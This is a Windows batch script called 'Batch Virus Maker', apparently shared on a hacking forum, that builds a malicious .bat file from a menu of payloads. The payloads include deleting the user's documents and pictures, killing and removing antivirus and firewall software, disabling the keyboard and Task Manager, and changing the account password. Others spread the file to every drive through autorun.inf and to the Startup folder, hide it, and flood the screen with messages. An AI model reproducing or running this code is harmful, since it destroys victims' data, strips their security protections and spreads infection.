
@echo off
start speech.vbs
color 0a
title Batch Virus Maker 0.1v (beta)
echo.
echo                   ##     ## #### ########  ##     ##  ######  
echo                   ##     ##  ##  ##     ## ##     ## ##    ## 
echo                   ##     ##  ##  ##     ## ##     ## ##       
echo                   ##     ##  ##  ########  ##     ##  ######  
echo                    ##   ##   ##  ##   ##   ##     ##       ## 
echo                     ## ##    ##  ##    ##  ##     ## ##    ## 
echo                      ###    #### ##     ##  #######   ######
echo.
echo                  ##     ##    ###    ##    ## ######## ########  
echo                  ###   ###   ## ##   ##   ##  ##       ##     ## 
echo                  #### ####  ##   ##  ##  ##   ##       ##     ## 
echo                  ## ### ## ##     ## #####    ######   ########  
echo                  ##     ## ######### ##  ##   ##       ##   ##   
echo                  ##     ## ##     ## ##   ##  ##       ##    ##  
echo                  ##     ## ##     ## ##    ## ######## ##     ## 
echo                                                    1.MLohar
echo.
echo             ........................................................
echo.
echo Type a title for your virus:
set /p name=Name:
echo.
echo @echo off > %name%.bat
echo title %name% >> %name%.bat
echo.
:bcolor
cls
echo.
echo What is the Background Color of your Program:
echo.
echo 0 = Black
echo 1 = Blue
echo 2 = Green
echo 3 = Aqua
echo 4 = Red
echo 5 = Purple
echo 6 = Yellow
echo 7 = White
echo 8 = Gray
echo 9 = Light Blue
echo a = Light Green
echo b = Light Aqua
echo c = Light Red
echo d = Light Purple
echo e = Light Yellow
echo f = Bright White
echo.
set /p bcolor=Background Color:
if %bcolor% == 0 goto tcolor
if %bcolor% == 1 goto tcolor
if %bcolor% == 2 goto tcolor
if %bcolor% == 3 goto tcolor
if %bcolor% == 4 goto tcolor
if %bcolor% == 5 goto tcolor
if %bcolor% == 6 goto tcolor
if %bcolor% == 7 goto tcolor
if %bcolor% == 8 goto tcolor
if %bcolor% == 9 goto tcolor
if %bcolor% == a goto tcolor
if %bcolor% == b goto tcolor
if %bcolor% == c goto tcolor
if %bcolor% == d goto tcolor
if %bcolor% == e goto tcolor
if %bcolor% == f goto tcolor
msg * Color not found!
goto bcolor
:tcolor
cls
echo.
echo What is the Text Color of your Program:
echo.
echo 0 = Black
echo 1 = Blue
echo 2 = Green
echo 3 = Aqua
echo 4 = Red
echo 5 = Purple
echo 6 = Yellow
echo 7 = White
echo 8 = Gray
echo 9 = Light Blue
echo a = Light Green
echo b = Light Aqua
echo c = Light Red
echo d = Light Purple
echo e = Light Yellow
echo f = Bright White
echo.
set /p tcolor=Text Color:
if %tcolor% == 0 goto color
if %tcolor% == 1 goto color
if %tcolor% == 2 goto color
if %tcolor% == 3 goto color
if %tcolor% == 4 goto color
if %tcolor% == 5 goto color
if %tcolor% == 6 goto color
if %tcolor% == 7 goto color
if %tcolor% == 8 goto color
if %tcolor% == 9 goto color
if %tcolor% == a goto color
if %tcolor% == b goto color
if %tcolor% == c goto color
if %tcolor% == d goto color
if %tcolor% == e goto color
if %tcolor% == f goto color
msg * Color not found!
goto tcolor
:color
echo color %bcolor%%tcolor% >> %name%.bat
:start
set command=123456
cls
echo.
time /t
date /t
echo.
echo Choose A Command Number To Add:
echo.
echo 0 - Donate To Creator
echo 1 - Delete My Documents
echo 2 - Delete All Music
echo 3 - Delete All Pictures
echo 4 - Disable Firewall
echo 5 - Disable Internet
echo 6 - Disable Keyboard
echo 7 - Block Google
echo 8 - Block Facebook
echo 9 - Block Youtube
echo 10 - Open Notepad Looply
echo 11 - Kill Antivirus System
echo 12 - Spam C: Drive
echo 13 - Kill Explorer.exe
echo 14 - Open Any website Looply
echo 15 - Disable Taskmanager
echo 16 - Infect All Drivers
echo 17 - Infect All Folders
echo 18 - Infect Startup Folder
echo 19 - Swap Mouse Buttons
echo 20 - Change Current Userpass
echo 21 - Hide Virus File After Run
echo 22 - Spam With MsgBox
echo 23 - Open/Close Disk Tray
echo.
set /p command=Command to add:
if %command% == 0 goto cmd0
if %command% == 1 goto cmd1
if %command% == 2 goto cmd2
if %command% == 3 goto cmd3
if %command% == 4 goto cmd4
if %command% == 5 goto cmd5
if %command% == 6 goto cmd6
if %command% == 7 goto cmd7
if %command% == 8 goto cmd8
if %command% == 9 goto cmd9
if %command% == 10 goto cmd10
if %command% == 11 goto cmd11
if %command% == 12 goto cmd12
if %command% == 13 goto cmd13
if %command% == 14 goto cmd14
if %command% == 15 goto cmd15
if %command% == 16 goto cmd16
if %command% == 17 goto cmd17
if %command% == 18 goto cmd18
if %command% == 19 goto cmd19
if %command% == 20 goto cmd20
if %command% == 21 goto cmd21
if %command% == 22 goto cmd22
if %command% == 23 goto cmd23
msg * Command Not Found
goto start
:cmd0
cls
start http://www.hackcommunity.com/User-Anonymous-227
msg * Coded For HackCommunity Members
goto start
:cmd1
cls
echo.
echo Please Wait
echo.
echo del /f /q "C:\Users\%userprofile%\My Documents\*.*" >> %name%.bat
msg * Command Added!
goto start
:cmd2
cls
echo.
echo Please Wait
echo.
echo del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*" >> %name%.bat
msg * Command Added!
goto start
:cmd3
cls
echo.
echo Please Wait
echo.
echo del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*" >> %name%.bat
msg * Command Added!
goto start
:cmd4
cls
echo.
echo Please Wait
echo.
echo net stop "MpsSvc" >> %name%.bat
echo taskkill /f /t /im "FirewallControlPanel.exe" >> %name%.bat
msg * Command Added!
goto start
:cmd5
cls
echo.
echo Please Wait
echo.
echo ipconfig /release >> %name%.bat
echo if ERRORLEVEL1 ipconfig /release_all >> %name%.bat
msg * Command Added!
goto start
:cmd6
cls
echo.
echo Please Wait
echo.
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg" >> %name%.bat
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg" >> %name%.bat
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg" >> %name%.bat
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg" >> %name%.bat
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg" >> %name%.bat
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg" >> %name%.bat
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg" >> %name%.bat
echo start nokeyboard.reg
msg * Command Added!
goto start
:cmd7
cls
echo.
echo Please Wait
echo.
echocd "C:\Windows\System32\Drivers\etc" >> %name%.bat
echo 127.0.0.1 google.com >> "Hosts">> %name%.bat
echo 127.0.0.1 http://www.google.com >> "Hosts" >> %name%.bat
msg * Command Added!
goto start
:cmd8
cls
echo.
echo Please Wait
echo.
echocd "C:\Windows\System32\Drivers\etc" >> %name%.bat
echo 127.0.0.1 google.com >> "Hosts">> %name%.bat
echo 127.0.0.1 http://www.facebook.com >> "Hosts" >> %name%.bat
msg * Command Added!
goto start
:cmd9
cls
echo.
echo Please Wait
echo.
echo cd "C:\Windows\System32\Drivers\etc" >> %name%.bat
echo 127.0.0.1 google.com >> "Hosts">> %name%.bat
echo 127.0.0.1 http://www.youtube.com >> "Hosts" >> %name%.bat
msg * Command Added!
goto start
:cmd10
cls
echo.
echo Please Wait
echo.
echo :loop >> %name%.bat
echo start notepad.exe >> %name%.bat
echo goto loop >> %name%.bat
msg * Command Added!
goto start
:cmd11
cls
echo.
echo Please Wait
echo.
echo CLS >> %name%.bat
echo taskkill /F /IM av* >NUL >> %name%.bat
echo taskkill /F /IM fire* >NUL >> %name%.bat
echo taskkill /F /IM anti* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM spy* >NUL >> %name%.bat
echo taskkill /F /IM bullguard* >NUL >> %name%.bat
echo taskkill /F /IM PersFw* >NUL >> %name%.bat
echo taskkill /F /IM KAV* >NUL >> %name%.bat
echo taskkill /F /IM ZONEALARM* >NUL >> %name%.bat
echo taskkill /F /IM SAFEWEB* >NUL >> %name%.bat
echo CLS >> %name%.bat 
echo taskkill /F /IM OUTPOST* >NUL >> %name%.bat
echo taskkill /F /IM nv* >NUL >> %name%.bat
echo taskkill /F /IM nav* >NUL >> %name%.bat
echo taskkill /F /IM F-* >NUL >> %name%.bat
echo taskkill /F /IM ESAFE* >NUL >> %name%.bat
echo taskkill /F /IM cle* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM BLACKICE* >NUL >> %name%.bat
echo taskkill /F /IM def* >NUL >> %name%.bat
echo taskkill /F /IM kav* >NUL >> %name%.bat
echo taskkill /F /IM kav* >NUL >> %name%.bat
echo taskkill /F /IM avg* >NUL >> %name%.bat
echo taskkill /F /IM ash* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM aswupdsv* >NUL >> %name%.bat
echo taskkill /F /IM ewid* >NUL >> %name%.bat
echo taskkill /F /IM guar* >NUL >> %name%.bat
echo taskkill /F /IM gcasDt* >NUL >> %name%.bat
echo taskkill /F /IM msmp* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM mcafe* >NUL >> %name%.bat
echo taskkill /F /IM mghtml* >NUL >> %name%.bat
echo taskkill /F /IM msiexec* >NUL >> %name%.bat
echo taskkill /F /IM outpost* >NUL >> %name%.bat
echo taskkill /F /IM isafe* >NUL >> %name%.bat
echo taskkill /F /IM zap* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM zauinst* >NUL >> %name%.bat
echo taskkill /F /IM upd* >NUL >> %name%.bat 
echo taskkill /F /IM zlclien* >NUL >> %name%.bat
echo taskkill /F /IM minilog* >NUL >> %name%.bat
echo taskkill /F /IM cc* b >NUL >> %name%.bat
echo taskkill /F /IM norton* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM norton au* >NUL >> %name%.bat
echo taskkill /F /IM ccc* >NUL >> %name%.bat
echo taskkill /F /IM npfmn* >NUL >> %name%.bat
echo taskkill /F /IM loge* >NUL >> %name%.bat
echo taskkill /F /IM nisum* >NUL >> %name%.bat
echo taskkill /F /IM issvc* >NUL >> %name%.bat
echo taskkill /F /IM tmp* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM tmn* >NUL >> %name%.bat
echo taskkill /F /IM pcc* >NUL >> %name%.bat
echo taskkill /F /IM cpd* >NUL >> %name%.bat
echo taskkill /F /IM pop* >NUL >> %name%.bat
echo taskkill /F /IM pav* >NUL >> %name%.bat
echo taskkill /F /IM padmin* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM panda* >NUL >> %name%.bat
echo taskkill /F /IM avsch* >NUL >> %name%.bat
echo taskkill /F /IM sche* >NUL >> %name%.bat
echo taskkill /F /IM syman* >NUL >> %name%.bat
echo taskkill /F /IM virus* >NUL >> %name%.bat
echo taskkill /F /IM realm* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo taskkill /F /IM sweep* >NUL >> %name%.bat
echo taskkill /F /IM scan* >NUL >> %name%.bat
echo taskkill /F /IM ad-* >NUL >> %name%.bat
echo taskkill /F /IM safe* >NUL >> %name%.bat
echo taskkill /F /IM avas* >NUL >> %name%.bat
echo taskkill /F /IM norm* >NUL >> %name%.bat
echo taskkill /F /IM offg* >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\alwils~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\Lavasoft\Ad-awa~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\kasper~1" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\trojan~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\f-prot95" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\tbav" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\avpersonal" /S >NUL >> %name%.bat
echo echoRMDIR /Q "C:\Program Files\Norton~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\Mcafee" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\Norton~1\Norton~1\Norton~3" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\Norton~1\Norton~1\speedd~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\Norton~1\Norton~1" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\Norton~1" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\avgamsr" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\avgamsvr" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\avgemc" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\avgcc" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\avgupsvc" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\grisoft" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\nood32krn" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\nood32" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\nod32" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\nood32" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\kav" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\kavmm" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\kaspersky" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\ewidoctrl" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\guard" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\ewido" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\pavprsrv" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\pavprot" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\avengine" /S >NUL >> %name%.bat
echo CLS >> %name%.bat
echo RMDIR /Q "C:\Program Files\apvxdwin" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\webproxy" /S >NUL >> %name%.bat
echo RMDIR /Q "C:\Program Files\panda software" /S >NUL >> %name%.bat
msg * Command Added!
goto start
:cmd12
cls
echo.
echo Please Wait
echo.
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
echo echo %random% > "C:\%random%Spammed Filetype" >> %name%.bat
msg * Command Added!
goto start
:cmd13
cls
echo.
echo Please Wait
echo.
echo taskkill explorer.exe >> %name%.bat
msg * Command Added!
goto start
:cmd14
cls
echo.
echo Enter Any Website URL:
echo.
set /p url=URL:
echo.
echo :A >> %name%.bat
echo start %URL% >> %name%.bat
echo goto :A >> %name%.bat
msg * Command Added!
goto start
:cmd15
cls
echo.
echo Please Wait
echo.
echo rem Disable Task Manager >> %name%.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul >> %name%.bat
msg * Command Added!
goto start
:cmd16
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Infect All Drives >> %name%.bat
echo for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do ( >> %name%.bat
echo copy /Y %0 %%E:\ >> %name%.bat
echo echo [AutoRun] > %%E:\autorun.inf >> %name%.bat
echo echo open="%%E:\%0" >> %%E:\autorun.inf >> %name%.bat
echo echo action=Open folder to see files... >> %%E:\autorun.inf) >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd17
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Infect All Folders >> %name%.bat
echo Dir %SystemRoot% /s /b > PathHost >> %name%.bat
echo For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul >> %name%.bat
echo Del /f /s /q PathHost > Nul >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd18
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Infect Startup Folder >> %name%.bat
echo copy %0 "%userprofile%\Start Menu\Programs\Startup" >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd19
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Swap Mouse Buttons >> %name%.bat
echo RUNDLL32 USER32.DLL,SwapMouseButton >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd20
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Change User Password To Ano >> %name%.bat
echo net user %username% Ano >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd21
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Hide Virus File After Run >> %name%.bat
echo attrib +h %0 >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd22
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Spam With VBScript Msgboxes >> %name%.bat
echo echo Do>>msgbox.vbs >> %name%.bat
echo echo x=msgbox("Your computer is infected with a virus!",0+48,"Infected") >>msgbox.vbs >> %name%.bat
echo echo Loop>>msgbox.vbs >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo start "" "msgbox.vbs" >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
:cmd23
cls
echo.
echo Please Wait
echo.
echo rem --------------------------------- >> %name%.bat
echo rem Start Opening Disk Tray >> %name%.bat
echo echo Do >> "opendisk.vbs" >> %name%.bat
echo echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs" >> %name%.bat
echo echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs" >> %name%.bat
echo echo colCDROMs.Item(d).Eject  >> "opendisk.vbs" >> %name%.bat
echo echo colCDROMs.Item(d).Eject  >> "opendisk.vbs" >> %name%.bat
echo echo Loop >> "opendisk.vbs" >> %name%.bat
echo start "" "opendisk.vbs" >> %name%.bat
echo rem --------------------------------- >> %name%.bat
msg * Command Added!
goto start
